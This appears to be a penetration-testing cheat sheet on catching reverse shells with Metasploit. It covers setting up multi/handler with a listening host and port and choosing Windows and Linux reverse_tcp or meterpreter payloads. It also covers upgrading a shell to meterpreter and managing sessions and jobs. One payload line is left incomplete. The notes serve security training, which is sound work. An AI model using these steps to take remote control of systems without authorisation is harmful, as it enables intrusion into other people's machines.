# Reverse Shell

## Multi Handler

* Start the PostgreSQL service `service postgresql start`.
* Start the metasploit console `msfconsole`.
* `use exploit/multi/handler`.

## Setting Up a listener in multi handler

* `set lhost 192.168.1.10`.
* `set lport 4444`.
* Then we need to specify the payload,
  * netcat shell \([https://netsec.ws/?p=292](https://netsec.ws/?p=292)\)
    * windows listener `set payload windows/shell/reverse_tcp`
    * linux listener `set payload linux/x86/shell/reverse_tcp`
  * meterpreter shell
    * windows listener `payload windows/meterpreter/reverse_tcp`
    * linux listener payload linux

## Upgrade Shell to meterpreter shell

* You need to have a metasploit listener for netcat.
* You need to create a new session. Either Ctrl+z or `background`.
* Then we need to change the exploit first to "shell\_to\_meterpreter".
  * `use post/multi/manage/shell_to_meterpreter`

## Session Management

### List active sessions and process

* Linux \(search for port 4444\)
  * lsof -t -i:4444
  * netstat -ano \| grep 4444
  * ps
* Windows
  * netstat -ano

### Managing "jobs" in metsploit framework

* List all jobs
  * jobs
* Kill all jobs
  * jobs -K
* Jobs help
  * help jobs
* 
### Killing a session

* Linux \(killing service with pid\)
  * kill -9 1234



![TCP connection states](../../../.gitbook/assets/image%20%2838%29.png)

